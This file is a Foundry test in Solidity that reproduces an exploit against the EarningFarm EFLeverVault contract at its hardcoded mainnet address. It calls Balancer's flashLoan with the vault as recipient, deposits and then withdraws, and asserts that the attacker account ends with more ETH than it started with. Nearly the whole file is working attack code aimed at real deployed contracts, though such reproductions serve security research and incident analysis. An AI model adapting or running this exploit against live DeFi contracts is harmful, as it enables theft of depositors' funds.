//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import {IERC20} from "../interfaces/IERC20.sol";

interface IEFLeverVault {
    function withdraw(uint256 _amount) external;
    function deposit(uint256 _amount) payable external;
    function getDebt() external view returns(uint256);
    function ef_token() external view returns(address);
}

interface IBalancer {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract EarningFarmExploitTest is Test {
    IEFLeverVault leverVault =
        IEFLeverVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IBalancer balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 ef_token;

    address bob = address(0xBEEf);

    function setUp() public {
    }

    function test_Attack() public{
        startHoax(bob);
        uint256 balanceBefore = bob.balance;
        console2.log("Eth balance of bob before",balanceBefore);
        uint256 amount = leverVault.getDebt();

        uint256[] memory amounts = new uint256[](1);
        address[] memory addresses = new address[](1);

        amounts[0] = amount;
        addresses[0] = weth; 

        ef_token = IERC20(leverVault.ef_token());

        leverVault.deposit{value: 0.1 ether}(0.1 ether);
        uint256 userAmount = ef_token.balanceOf(bob);
        balancer.flashLoan(address(leverVault), addresses, amounts, "0x2");
        leverVault.withdraw(userAmount);

        uint256 balanceAfter = bob.balance;

        console2.log("Eth balance of bob after",balanceAfter);
        assertGt(balanceAfter,balanceBefore);

    }
}
